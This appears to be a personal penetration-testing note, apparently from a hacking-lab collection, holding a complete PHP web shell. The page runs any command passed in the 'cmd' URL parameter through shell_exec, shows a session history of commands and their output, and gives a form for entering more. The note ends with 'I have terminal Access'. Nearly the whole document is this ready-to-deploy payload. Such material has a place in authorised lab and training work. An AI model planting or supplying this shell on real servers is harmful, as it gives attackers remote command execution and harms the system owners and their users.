# quality-payload

Author: Julien Bongars
Date: 2025-09-21 09:48:44
Path: /opt/development/cybersec/hacklas/notes/infiltration/reverse-shell/php/quality-payload.md

---

## Payload

```php
<!DOCTYPE html>
<html>
<head>
    <title>Shell</title>
</head>
<body>

<?php
session_start();

if (!isset($_SESSION['history'])) {
    $_SESSION['history'] = array();
}

if (isset($_GET['cmd']) && !empty($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    $output = shell_exec($cmd . ' 2>&1');
    $_SESSION['history'][] = array('cmd' => $cmd, 'output' => $output);
}

if (isset($_GET['clear'])) {
    $_SESSION['history'] = array();
}
?>

<div style="border: 1px solid #ccc; height: 400px; overflow-y: scroll; padding: 10px; font-family: monospace; background: #f5f5f5;">
<?php
foreach ($_SESSION['history'] as $entry) {
    echo "<div>";
    echo "<strong>$ " . htmlspecialchars($entry['cmd']) . "</strong><br>";
    echo "<pre>" . htmlspecialchars($entry['output']) . "</pre>";
    echo "</div>";
}
?>
</div>

<form>
    <input type="text" name="cmd" placeholder="Command" style="width: 300px;">
    <input type="submit" value="Run">
    <a href="?clear=1">Clear History</a>
</form>

</body>
</html>
```

## I have terminal Access
